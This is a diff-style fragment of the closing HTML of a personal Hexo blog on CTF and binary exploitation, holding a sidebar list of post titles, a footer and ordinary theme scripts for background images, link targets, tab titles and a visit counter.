+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2021/08/15/babyfengshui_33c3_2016%20writeup/">babyfengshui_33c3_2016 writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/07/19/ret2dl_resolve/">ret2dl_resolve</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/07/15/%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9Bpwn1%20writeup/">canary保护学习报告:通过字符串泄露canary</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/06/29/SROP%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/">SROP</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/06/19/%E5%9B%BD%E8%B5%9B%E7%BA%BF%E4%B8%8B%E8%B5%9B/">2021华东南赛区国赛线下赛</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/06/08/axb_2019_fmt32%20wp/">axb_2019_fmt32 wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/06/05/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%A9%E7%94%A8/">格式化字符串漏洞利用</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/22/cachelab/">cachelab实验报告:模拟cache的功能</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/22/%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/">动态调试工具的使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/22/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%AD%A6%E4%B9%A0/">系统调用</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/13/ret2libc%E5%AE%9E%E6%88%98/">ret2libc实战</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/10/archlab%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9Ay86%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8/">archlab实验报告：y86命令使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/08/RSA/">RSA解密</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/06/%E7%BA%A2%E5%B8%BD%E6%9D%AF2019%20Easyre%20wp/">红帽杯2019 easyRe</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/01/ret2libc%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/">ret2libc学习报告</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/01/%E7%BB%95%E8%BF%87canary%E4%BF%9D%E6%8A%A4/">canary保护学习报告:通过字符串泄露canary</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/30/buflab/">bufblab实验报告:32位程序缓冲区溢出攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/25/attqacklab/">attacklab实验报告:代码注入以及rop攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/19/bomblab/">bomblab实验报告:二进制安全与逆向分析</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2021 xia0ji233
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 5;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+    <script>
+        var originTitle = document.title;
+        var titleTime;
+        document.addEventListener("visibilitychange", function() {
+            if (document.hidden) {
+                document.title = "(つェ⊂) 我藏好了哦~ " + originTitle;
+                clearTimeout(titleTime);
+            }
+            else {
+                document.title = "(*´∇｀*) 被你发现啦~ " + originTitle;
+                titleTime = setTimeout(function() {
+                    document.title = originTitle;
+                }, 2000);
+            }
+        })
+    </script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
